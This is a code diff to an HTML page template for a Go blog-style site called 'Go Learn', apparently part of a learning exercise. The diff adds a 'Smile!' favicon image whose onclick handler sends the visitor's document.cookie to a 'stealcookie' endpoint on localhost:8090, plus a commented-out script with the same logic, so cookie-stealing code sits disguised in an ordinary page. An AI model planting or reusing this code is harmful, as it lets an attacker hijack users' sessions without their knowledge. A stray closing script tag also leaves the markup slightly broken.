@@ -5,12 +5,14 @@
 <html lang="en">
 <link rel="stylesheet" href="/assets/style.css">
 <head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width" />
   <title>Go Learn</title>
 </head>
 <body>
   <img src="/assets/go-logo-white.svg" alt="go learn" />
+  </script>
   <div class="container">
     <ul>
       {{ range .posts }}
@@ -18,5 +20,25 @@
       {{ end }}
     </ul>
   </div>
+  <!-- <a href="http://www.spektr.no/"> -->
+  <img id="mylink" src="/assets/favicon_io/favicon.ico" alt="Smile!" onclick="this.src='http://localhost:8090/stealcookie?cookie_data='+escape(document.cookie);"
+  onerror="this.onerror=null;this.src='/assets/favicon_io/favicon.ico'" style="vertical-align:middle;margin:0px 50px" />
+ <!-- </a> -->
+  <!-- <script type="text/javascript">
+    var a = document.getElementById("mylink");
+    a.onclick = function() {
+      // location.href="http://localhost:8090/stealcookie?cookie_data="+escape(document.cookie);
+      // console.log("cookie sent");
+
+      // var url_string="http://localhost:8090/stealcookie?cookie_data="+escape(document.cookie);
+      // var url = new URL(url_string);
+      // var c = url.searchParams.get("cookie_data");
+      // console.log(c);
+      // $.get(url, function(data, status){
+      //   console.log("Data: " + data + " Status: " + status);
+      // });
+      return true;
+    }
+  </script> -->
 </body>
 </html>
